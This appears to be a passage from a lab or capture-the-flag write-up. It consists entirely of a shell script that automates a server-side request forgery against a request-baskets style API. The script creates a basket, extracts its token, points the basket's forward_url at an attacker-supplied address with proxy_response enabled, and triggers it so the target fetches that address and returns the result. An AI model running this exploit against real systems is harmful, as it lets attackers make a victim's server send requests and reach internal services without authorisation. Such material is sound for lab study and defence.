### Automate the SSRF

```bash
#!/bin/sh


# Base target URL (example: http://IP:55555)
Machine_URL=$1


# Attacker-controlled URL
# Example: http://10.10.14.148:8000
Attacker_Url=$2


# Generate a random basket name (7 characters)
Random_Backet_Name=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 7)

echo '\n################################# \n'

echo "Now This URL : $Machine_URL/$Random_Backet_Name -> Makes requests to $Attacker_Url \n"

echo "#################################\n"



# Create the basket and extract the authorization token
Authorization_Token=$(curl -sS -X POST "$Machine_URL/api/baskets/$Random_Backet_Name" | jq -r .token)


# Configure the basket to forward requests to the attacker URL
curl -sS -X PUT \
  "$Machine_URL/api/baskets/$Random_Backet_Name" \
  -H "Authorization: $Authorization_Token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "{\"forward_url\":\"$Attacker_Url\",\"proxy_response\":true,\"insecure_tls\":true,\"expand_path\":false,\"capacity\":200}"


# Trigger the basket to forward the request
response=$(curl -sS "$Machine_URL/$Random_Backet_Name")


# Output the response
echo '####################### Server Response #######################'
echo "$response"

```
